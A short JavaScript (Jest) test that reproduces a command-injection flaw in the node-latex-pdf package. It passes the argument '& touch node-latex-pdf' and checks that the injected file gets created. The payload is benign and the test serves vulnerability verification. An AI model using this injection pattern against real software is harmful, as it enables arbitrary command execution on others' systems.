test("Command Injection in node-latex-pdf", (done) => {
  expect.assertions(2);
  const a = require("node-latex-pdf");
  const fs = require("fs");
  const path = "./node-latex-pdf";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a("./", "& touch node-latex-pdf", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlinkSync(path);
    done();
  });
});
